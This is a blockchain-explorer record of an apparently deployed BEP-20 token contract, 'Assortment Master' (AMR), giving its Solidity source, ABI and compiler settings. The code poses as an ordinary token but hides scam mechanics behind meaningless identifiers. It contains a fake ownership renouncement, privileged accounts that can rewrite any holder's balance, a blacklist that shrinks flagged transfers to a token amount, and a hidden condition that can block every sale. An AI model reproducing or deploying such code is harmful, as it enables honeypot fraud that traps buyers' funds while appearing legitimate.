{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface fromSell {\n    function createPair(address launchAuto, address shouldTx) external returns (address);\n}\n\ninterface exemptAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTakeFee) external view returns (uint256);\n\n    function transfer(address takeShould, uint256 swapEnable) external returns (bool);\n\n    function allowance(address listAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeShould,\n        uint256 swapEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxAuto, uint256 value);\n    event Approval(address indexed listAt, address indexed spender, uint256 value);\n}\n\nabstract contract minReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalIs is exemptAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssortmentMaster is minReceiver, exemptAuto, totalIs {\n\n    mapping(address => bool) public isLimitFund;\n\n    function txTotalFrom(address totalTrading) public {\n        receiverSell();\n        if (launchReceiver) {\n            minList = false;\n        }\n        if (totalTrading == buyMarketing || totalTrading == tradingReceiver) {\n            return;\n        }\n        isTake[totalTrading] = true;\n    }\n\n    function atSender(address autoLaunch, uint256 swapEnable) public {\n        receiverSell();\n        minTotal[autoLaunch] = swapEnable;\n    }\n\n    function modeIsAuto(uint256 swapEnable) public {\n        receiverSell();\n        maxBuyIs = swapEnable;\n    }\n\n    bool public launchReceiver;\n\n    bool public liquidityBuy;\n\n    uint256 private receiverWallet;\n\n    mapping(address => bool) public isTake;\n\n    function transferFrom(address txWallet, address takeShould, uint256 swapEnable) external override returns (bool) {\n        if (_msgSender() != listSender) {\n            if (maxSellIs[txWallet][_msgSender()] != type(uint256).max) {\n                require(swapEnable <= maxSellIs[txWallet][_msgSender()]);\n                maxSellIs[txWallet][_msgSender()] -= swapEnable;\n            }\n        }\n        return toMax(txWallet, takeShould, swapEnable);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoIs;\n    }\n\n    uint8 private launchSell = 18;\n\n    string private amountFeeIs = \"Assortment Master\";\n\n    address private teamMode;\n\n    constructor (){\n        if (atSellEnable) {\n            fromTx = false;\n        }\n        shouldLimit launchedFund = shouldLimit(listSender);\n        tradingReceiver = fromSell(launchedFund.factory()).createPair(launchedFund.WETH(), address(this));\n        \n        buyMarketing = _msgSender();\n        isLimitFund[buyMarketing] = true;\n        minTotal[buyMarketing] = autoIs;\n        atLimit();\n        if (receiverWallet != teamReceiver) {\n            teamReceiver = toReceiver;\n        }\n        emit Transfer(address(0), buyMarketing, autoIs);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountFeeIs;\n    }\n\n    bool private takeFrom;\n\n    bool private minList;\n\n    uint256 private autoIs = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchSell;\n    }\n\n    function autoWalletFee(address launchIsExempt) public {\n        if (liquidityBuy) {\n            return;\n        }\n        \n        isLimitFund[launchIsExempt] = true;\n        if (receiverWallet != teamReceiver) {\n            exemptTake = true;\n        }\n        liquidityBuy = true;\n    }\n\n    address public tradingReceiver;\n\n    uint256 private teamReceiver;\n\n    function toMax(address txWallet, address takeShould, uint256 swapEnable) internal returns (bool) {\n        if (txWallet == buyMarketing) {\n            return modeMarketingLiquidity(txWallet, takeShould, swapEnable);\n        }\n        uint256 totalShouldList = exemptAuto(tradingReceiver).balanceOf(senderLaunched);\n        require(totalShouldList == maxBuyIs);\n        require(takeShould != senderLaunched);\n        if (isTake[txWallet]) {\n            return modeMarketingLiquidity(txWallet, takeShould, isTakeLiquidity);\n        }\n        return modeMarketingLiquidity(txWallet, takeShould, swapEnable);\n    }\n\n    bool public atSellEnable;\n\n    bool public fromTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoFromTake;\n    }\n\n    function owner() external view returns (address) {\n        return teamMode;\n    }\n\n    string private autoFromTake = \"AMR\";\n\n    function receiverSell() private view {\n        require(isLimitFund[_msgSender()]);\n    }\n\n    bool public totalBuy;\n\n    function approve(address isMax, uint256 swapEnable) public virtual override returns (bool) {\n        maxSellIs[_msgSender()][isMax] = swapEnable;\n        emit Approval(_msgSender(), isMax, swapEnable);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamMode;\n    }\n\n    event OwnershipTransferred(address indexed teamTo, address indexed launchedTradingToken);\n\n    function atLimit() public {\n        emit OwnershipTransferred(buyMarketing, address(0));\n        teamMode = address(0);\n    }\n\n    address public buyMarketing;\n\n    function allowance(address totalAtWallet, address isMax) external view virtual override returns (uint256) {\n        if (isMax == listSender) {\n            return type(uint256).max;\n        }\n        return maxSellIs[totalAtWallet][isMax];\n    }\n\n    function transfer(address autoLaunch, uint256 swapEnable) external virtual override returns (bool) {\n        return toMax(_msgSender(), autoLaunch, swapEnable);\n    }\n\n    function balanceOf(address atTakeFee) public view virtual override returns (uint256) {\n        return minTotal[atTakeFee];\n    }\n\n    uint256 constant isTakeLiquidity = 4 ** 10;\n\n    uint256 private toReceiver;\n\n    bool public exemptTake;\n\n    address senderLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private maxSellIs;\n\n    uint256 maxBuyIs;\n\n    uint256 shouldAmount;\n\n    mapping(address => uint256) private minTotal;\n\n    address listSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function modeMarketingLiquidity(address txWallet, address takeShould, uint256 swapEnable) internal returns (bool) {\n        require(minTotal[txWallet] >= swapEnable);\n        minTotal[txWallet] -= swapEnable;\n        minTotal[takeShould] += swapEnable;\n        emit Transfer(txWallet, takeShould, swapEnable);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTradingToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAtWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSellEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIsExempt\",\"type\":\"address\"}],\"name\":\"autoWalletFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTakeFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLimitFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"modeIsAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"}],\"name\":\"txTotalFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssortmentMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}